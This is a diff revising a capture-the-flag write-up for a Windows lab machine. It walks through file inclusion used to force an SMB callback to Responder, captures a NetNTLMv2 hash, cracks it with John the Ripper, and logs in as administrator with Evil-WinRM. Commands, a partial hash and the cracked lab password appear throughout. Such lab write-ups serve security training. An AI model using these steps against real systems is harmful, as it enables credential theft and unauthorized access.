@@ -33,7 +33,7 @@
 
 ---
 ## Flag:
-nmap:
+Nmap:
 
 ```console
 ┌──(kali㉿kali)-[~]
@@ -100,9 +100,15 @@ This might be vulnerable to file inclusion.
 
 ![](./attachments/Pasted%20image%2020220413133157.png)
 
-It is! Since this is a window computer we can trick it into initializing the SMB protocol by providing it with a random path to our local machine. During the initial SMB key exchange, we might be able to grab the NetNTLMv (hash) corresponding to a privileged account. We can utilize a tool called 'Responder' to set up an SMB server and grab what we need.
+It is. We can access the local DNS file of the server.
+
+Since this is a window computer, we can trick it into initializing the SMB protocol by providing it with a random path to our local machine. During the initial SMB key exchange, we will be able to grab the NetNTLMv (hash) corresponding to a privileged account. We can utilize a tool called 'Responder' to set up an SMB server and grab what we need.
+
+Initiating SMB connection from the host by injecting payload.
 
 ![](./attachments/Pasted%20image%2020220413140044.png)
+
+Responder recieves the request.
 
 ```console
 ┌──(kali㉿kali)-[~/Downloads/Responder]
@@ -126,48 +132,7 @@ It is! Since this is a window computer we can trick it into initializing the SMB
     DNS                        [ON]
     DHCP                       [OFF]
 
-[+] Servers:
-    HTTP server                [ON]
-    HTTPS server               [ON]
-    WPAD proxy                 [OFF]
-    Auth proxy                 [OFF]
-    SMB server                 [ON]
-    Kerberos server            [ON]
-    SQL server                 [ON]
-    FTP server                 [ON]
-    IMAP server                [ON]
-    POP3 server                [ON]
-    SMTP server                [ON]
-    DNS server                 [ON]
-    LDAP server                [ON]
-    RDP server                 [ON]
-    DCE-RPC server             [ON]
-    WinRM server               [ON]
-
-[+] HTTP Options:
-    Always serving EXE         [OFF]
-    Serving EXE                [OFF]
-    Serving HTML               [OFF]
-    Upstream Proxy             [OFF]
-
-[+] Poisoning Options:
-    Analyze Mode               [OFF]
-    Force WPAD auth            [OFF]
-    Force Basic Auth           [OFF]
-    Force LM downgrade         [OFF]
-    Force ESS downgrade        [OFF]
-
-[+] Generic Options:
-    Responder NIC              [tun0]
-    Responder IP               [10.10.14.15]
-    Responder IPv6             [dead:beef:2::100d]
-    Challenge set              [random]
-    Don't Respond To Names     ['ISATAP']
-
-[+] Current Session Variables:
-    Responder Machine Name     [WIN-26LJT5D4U71]
-    Responder Domain Name      [YIU4.LOCAL]
-    Responder DCE-RPC Port     [46865]
+(...)
 
 [+] Listening for events...                                                                                              
 
@@ -185,6 +150,14 @@ A0054003500440034005500370031002E0059004900550034002E004C004F00430041004C0003001
 
 Now that we have the hash, we can use 'John the Ripper' to brute force the password using a [wordlist](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials).
 
+Command:
+
+`sudo john --format=netntlmv2 -w=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt hash.txt`
+
+`--format`: Use netntlmv2 format.
+
+`-w=`: Use this wordlist.
+
 ```console
 ┌──(kali㉿kali)-[~/Downloads/Responder]
 └─$ sudo john --format=netntlmv2 -w=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt hash.txt
@@ -198,7 +171,17 @@ Use the "--show --format=netntlmv2" options to display all of the cracked passwo
 Session completed. 
 ```
 
-We got the password! Now we just need to utilize it, since Linux doesn't support PowerShell out of the box, we'll use 'Evil-WinRM'.
+We cracked the password. Now we just need to utilize it, since Linux doesn't support PowerShell out of the box, we'll use 'Evil-WinRM' to connect to the server.
+
+Command:
+
+`evil-winrm -i 10.129.156.117 -u administrator -p badminton`
+
+`-i`: Host we want to connect to.
+
+`-u`: User we want to log in as.
+
+`-p`: Password of that user.
 
 ```console
 ┌──(kali㉿kali)-[~/Downloads/Responder]
